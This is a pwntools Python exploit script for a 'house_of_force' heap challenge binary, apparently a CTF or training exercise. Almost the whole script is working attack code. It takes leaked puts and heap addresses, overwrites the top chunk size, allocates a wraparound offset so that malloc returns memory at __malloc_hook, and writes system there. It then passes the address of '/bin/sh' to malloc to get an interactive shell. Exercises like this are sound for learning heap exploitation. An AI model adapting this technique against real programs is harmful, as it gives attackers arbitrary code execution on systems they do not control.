#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./house_of_force")
libc = elf.libc

MAX_SIZE = 0xffffffffffffffff

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (MAX_SIZE - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym["puts"]

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
log.info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
log.info(f"target: 0x{elf.sym.target:02x}")

# # Overwrite the available top chunk
malloc(24, b"A" * 24 + p64(MAX_SIZE))

# # The delta() function finds the "wraparound" distance between two addresses.
# log.info(f"delta between heap & main(): 0x{delt a(heap, elf.sym.main):02x}")
OFFSET = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
malloc(OFFSET, b"A")
malloc(8, p64(libc.sym.system))
io.send(b"1")

BINSH = libc.search(b"/bin/sh\x00").__next__()

info("BINSH: " + hex(BINSH))

io.sendafter(b"size: ", "{:d}".format(BINSH))

# =============================================================================

io.interactive()
